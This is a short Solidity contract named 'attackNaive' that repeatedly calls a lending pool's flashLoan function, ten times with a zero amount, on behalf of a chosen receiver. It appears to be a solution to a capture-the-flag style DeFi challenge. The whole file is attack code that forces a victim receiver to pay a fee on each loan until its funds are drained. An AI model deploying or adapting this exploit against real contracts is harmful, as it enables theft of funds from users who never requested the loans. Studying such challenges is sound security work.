pragma solidity ^0.8.0;

interface IPool {
    function flashLoan(address borrower, uint256 borrowAmount) external;
}

contract attackNaive {
    IPool pool;
    address receiver;
    address owner;

    constructor(address _pool, address _receiver) {
        pool = IPool(_pool);
        owner = msg.sender;
        receiver = _receiver;
    }

    function attack() external {
        for (uint256 i; i < 10; i++) {
            pool.flashLoan(receiver, 0);
        }
    }
}
